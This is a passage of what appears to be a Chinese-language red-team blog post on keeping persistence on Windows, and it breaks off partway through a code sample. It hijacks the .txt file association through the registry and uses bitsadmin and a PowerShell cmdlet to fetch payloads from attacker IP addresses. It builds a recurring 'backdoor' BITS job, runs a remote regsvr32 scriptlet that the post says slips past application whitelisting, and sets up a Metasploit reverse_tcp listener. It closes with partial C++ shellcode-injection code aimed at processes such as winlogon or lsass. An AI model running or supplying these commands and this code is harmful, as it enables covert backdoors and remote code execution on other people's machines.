    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的&quot;打开方式&quot;进行关联选择。</p>
<p>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706171822352.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171822352.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171822352.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171822352.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171822352.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>用ftype命令显示或修改用在文件扩展名关联中的文件类型。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706171834679.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171834679.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171834679.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171834679.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171834679.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p>
<p>修改注册表（管理员权限）</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKCR\txtfile\shell\open\command&#34;</span> /<span style="color:#58a1dd">ve</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_EXPAND_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;C:\Windows\system32\cmd.exe %1&#34;</span> /<span style="color:#58a1dd">f</span></span></span></code></pre></div><p>再打开txt文件打开的是cmd</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706171936609.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171936609.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171936609.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171936609.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706171936609.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="bitsadmin" class="heading-element"><span>Bitsadmin</span>
  <a href="#bitsadmin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ <strong>bitsadmin</strong> ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p>
<p>从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载payload（可执行文件，PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，以在红队操作中保持持久性。但是，与“ <strong>bitsadmin</strong> ” 进行交互需要管理员级别的权限。执行以下命令会将恶意payload从远程位置下载到本地目录。</p>
<p>window7以上自带</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\<span style="color:#58a1dd">bitsadmin</span>.<span style="color:#58a1dd">exe</span> /<span style="color:#58a1dd">transfer</span> <span style="color:#58a1dd">backdoor</span> /<span style="color:#58a1dd">download</span> /<span style="color:#58a1dd">priority</span> <span style="color:#58a1dd">high</span> <span style="color:#a6be9d">&#34;http://192.168.1.106/CM.EXE&#34;</span> <span style="color:#58a1dd">C:</span>\<span style="color:#a6be9d">1</span>.<span style="color:#58a1dd">exe</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714142109258.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714142109258.png" alt="image-20210714142109258" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714142109258.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714142109258.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714142109258.png?size=large 2x" data-title="image-20210714142109258" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>有一个PowerShell cmdlet可以执行相同的任务</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Start-BitsTransfer</span> <span style="color:#58a1dd">-Source</span> <span style="color:#a6be9d">&#34;http://10.0.2.21/pentestlab.exe&#34;</span> <span style="color:#58a1dd">-Destination</span> <span style="color:#a6be9d">&#34;C:\tmp\pentestlab.exe&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111110205620-1082423963.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110205620-1082423963.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110205620-1082423963.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110205620-1082423963.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110205620-1082423963.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>将文件放入磁盘后，可以通过从<code>bitsadmin</code>实用程序执行以下命令来实现持久性。</p>
<ol>
<li>在创建参数需要作业的名称</li>
<li>该addfile需要文件的远程位置和本地路径</li>
<li>该SetNotifyCmdLine将执行的命令</li>
<li>所述SetMinRetryDelay定义时间回调（秒）</li>
<li>激活传输队列中的新作业或挂起的作业</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">create</span> <span style="color:#58a1dd">backdoor</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">addfile</span> <span style="color:#58a1dd">backdoor</span> <span style="color:#a6be9d">&#34;http://192.168.1.106/CM.EXE&#34;</span>  <span style="color:#a6be9d">&#34;C:\1.exe&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">SetNotifyCmdLine</span> <span style="color:#58a1dd">backdoor</span> <span style="color:#58a1dd">C:</span>\<span style="color:#a6be9d">1</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">NUL</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">SetMinRetryDelay</span> <span style="color:#a6be9d">&#34;backdoor&#34;</span> <span style="color:#a6be9d">60</span> 
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">resume</span> <span style="color:#58a1dd">backdoor</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111110227491-23710429.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110227491-23710429.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110227491-23710429.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110227491-23710429.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110227491-23710429.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>参数<strong>SetNotifyCmdLine</strong>也可以用于通过<a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/"target="_blank" rel="external nofollow noopener noreferrer">regsvr32</a>实用程序从远程位置执行scriptlet 。这种方法的好处是它不会接触磁盘，并且可以避开将应用程序列入白名单的产品。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">SetNotifyCmdLine</span> <span style="color:#58a1dd">backdoor</span> <span style="color:#58a1dd">regsvr32</span>.<span style="color:#58a1dd">exe</span> <span style="color:#a6be9d">&#34;/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bitsadmin</span> /<span style="color:#58a1dd">resume</span> <span style="color:#58a1dd">backdoor</span></span></span></code></pre></div><p>Metasploit框架可用于通过<code>web_delivery</code>模块捕获payload。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">use</span> <span style="color:#58a1dd">exploit</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">multi</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">script</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">web_delivery</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">target</span> <span style="color:#a6be9d">3</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">payload</span> <span style="color:#58a1dd">windows</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x64</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">meterpreter</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">reverse_tcp</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">LHOST</span> <span style="color:#a6be9d">10.0.2.21</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">exploit</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111110318972-2018078810.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110318972-2018078810.png" alt="BITS Jobs – Regsvr32" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110318972-2018078810.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110318972-2018078810.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111110318972-2018078810.png?size=large 2x" data-title="BITS Jobs – Regsvr32" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="进程注入" class="heading-element"><span>进程注入</span>
  <a href="#%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现</p>
<p><strong>如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa</strong></p>
<p>关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程</p>
<p>同样还有shellcode注入</p>
<p>一个demo</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">CeatRemoThread</span>(<span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">pid</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">hThread</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dwOldProtect</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dwThreadId</span>;
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">shellcode_size</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">buf</span>);
</span></span><span style="display:flex;"><span> <span style="color:#828b96;font-style:italic">//混淆
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span> <span style="color:#ff636f">char</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">newBuf</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">decrypt</span>(<span style="color:#58a1dd">buf</span>, <span style="color:#58a1dd">shellcode_size</span>, (<span style="color:#58a1dd">LPVOID</span><span style="color:#ff636f">*</span>)<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">newBuf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">hHandle</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">OpenProcess</span>(<span style="color:#58a1dd">PROCESS_ALL_ACCESS</span>, <span style="color:#58a1dd">false</span>, <span style="color:#58a1dd">pid</span>);
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">hHandle</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;openprocessError&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">free</span>(<span style="color:#58a1dd">newBuf</span>);
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">return</span> <span style="color:#58a1dd">FALSE</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">Memory</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">VirtualAllocEx</span>(<span style="color:#58a1dd">hHandle</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">newBuf</span>) <span style="color:#ff636f">+</span> <span style="color:#a6be9d">1</span>, <span style="color:#58a1dd">MEM_COMMIT</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">MEM_RESERVE</span>, <span style="color:#58a1dd">PAGE_READWRITE</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">SIZE_T</span> <span style="color:#58a1dd">dwSize</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">WriteProcessMemory</span>(<span style="color:#58a1dd">hHandle</span>, <span style="color:#58a1dd">Memory</span>, <span style="color:#58a1dd">newBuf</span>, <span style="color:#58a1dd">shellcode_size</span> <span style="color:#ff636f">/</span> <span style="color:#a6be9d">3</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">dwSize</span>);
